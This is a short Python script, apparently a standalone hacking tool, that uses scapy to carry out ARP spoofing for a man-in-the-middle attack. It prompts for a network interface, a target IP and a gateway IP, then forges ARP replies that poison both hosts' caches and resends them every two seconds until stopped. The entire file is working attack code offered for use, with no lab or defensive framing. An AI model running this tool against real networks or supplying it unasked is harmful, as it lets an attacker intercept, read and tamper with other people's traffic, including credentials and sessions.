import netifaces
import ipaddress
from scapy.all import ARP, Ether, sendp
import logging
import time

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class MITMAttack:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.mac = self.get_interface_mac(self.interface)
        self.broadcast = "ff:ff:ff:ff:ff:ff"

    def get_interface_mac(self, interface):
        try:
            return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
        except ValueError:
            raise ValueError(f"Invalid interface '{interface}'")

    def validate_ip(self, ip):
        try:
            return ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            raise ValueError(f"Invalid IP address '{ip}'")

    def _create_arp_response(self, source_ip, target_ip, target_mac):
        return Ether(src=self.mac, dst=target_mac) / ARP(
            op=2, hwsrc=self.mac, hwdst=target_mac, psrc=source_ip, pdst=target_ip
        )

    def run_attack(self):
        arp_response_target = self._create_arp_response(
            self.gateway_ip, self.target_ip, self.broadcast
        )
        arp_response_gateway = self._create_arp_response(
            self.target_ip, self.gateway_ip, self.broadcast
        )

        logging.info("MITM Running... Press Ctrl+C to stop the attack.")
        try:
            while True:
                sendp(arp_response_target, iface=self.interface)
                sendp(arp_response_gateway, iface=self.interface)
                time.sleep(2)  # Add sleep to prevent overloading the network
        except KeyboardInterrupt:
            logging.info("\nMITM Attack Stopped.")


if __name__ == "__main__":
    interface = input("Enter the interface name: ")
    target_ip = input("Enter the target IP address: ")
    gateway_ip = input("Enter the gateway IP address: ")

    try:
        mitm = MITMAttack(
            target_ip=target_ip, gateway_ip=gateway_ip, interface=interface
        )
        mitm.run_attack()
    except ValueError as e:
        logging.error(e)
